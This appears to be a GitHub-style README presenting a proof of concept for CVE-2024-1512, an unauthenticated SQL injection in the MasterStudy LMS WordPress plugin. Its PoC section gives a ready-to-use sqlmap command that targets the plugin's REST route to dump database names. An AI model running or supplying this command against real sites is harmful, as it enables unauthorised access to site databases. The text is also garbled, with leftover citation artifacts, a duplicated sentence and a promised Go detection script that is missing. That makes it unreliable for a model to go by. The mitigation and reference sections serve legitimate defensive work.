# CVE-2024-1512 Proof of Concept

## Vulnerability Overview
CVE-2024-1512 is a critical vulnerability in the MasterStudy LMS WordPress Plugin for Online Courses and Education, specifically affecting versions up to and including 3.2.5. This vulnerability allows unauthenticated attackers to execute union-based SQL Injection via the 'user' parameter of the `/lms/stm-lms/order/items` REST route. Insufficient escaping of the user-supplied parameter and inadequate preparation of the existing SQL query enable attackers to append additional SQL queries to existing ones, potentially extracting sensitive information from the database&#8203;``【oaicite:3】``&#8203;&#8203;``【oaicite:2】``&#8203;.

## CVSS Score
- **CVSS v3.1 Base Score:** 9.8 CRITICAL
- **Vector:** CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H&#8203;``【oaicite:1】``&#8203;&#8203;``【oaicite:0】``&#8203;.

## Proof of Concept (PoC)
Exploit with sqlmap, by replacing http://example.com with the target URL.
```bash
sqlmap -u 'http://example.com/?rest_route=/lms/stm-lms/order/items&author_id=111&user=555' --dbs --batch -p user
```

### Detection
The Go script provided in repository can be used to detect the presence of this vulnerability by timing the response to a crafted SQL injection payload.
A Go script provided below can be used to detect the presence of this vulnerability by timing the response to a crafted SQL injection payload:

## Mitigation
Update the MasterStudy LMS WordPress Plugin to a version later than 3.2.5, where this vulnerability has been addressed. Always validate and sanitize input parameters rigorously to prevent SQL injection vulnerabilities.

## References
NVD - CVE-2024-1512 Detail  
Tenable - CVE-2024-1512  
Wordfence Security Advisory - MasterStudy LMS Plugin Vulnerability  
